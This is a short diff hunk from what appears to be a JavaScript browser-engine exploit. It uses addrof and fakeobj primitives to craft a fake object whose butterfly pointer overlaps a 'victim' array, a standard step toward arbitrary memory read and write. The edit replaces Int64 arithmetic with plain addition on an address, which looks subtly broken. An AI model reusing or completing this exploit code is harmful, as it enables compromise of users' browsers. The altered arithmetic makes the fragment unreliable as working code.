@@ -572,9 +572,9 @@ b.process = (inputs, outputs, parameters)=>{
 
     // create object having |victim| as butterfly.
     var containerAddr = addrof(container);
-    print(`[+] container @ ${containerAddr}`);
+    print("[+] container @ " + containerAddr);
     // add the offset to let compiler recognize fake structure
-    var hax = fakeobj(Add(containerAddr, new Int64(0x10)));
+    var hax = fakeobj(containerAddr + 0x10);
     // origButterfly is now based on the offset of **victim** 
     // because it becomes the new butterfly pointer
     // and hax[1] === victim.pointer
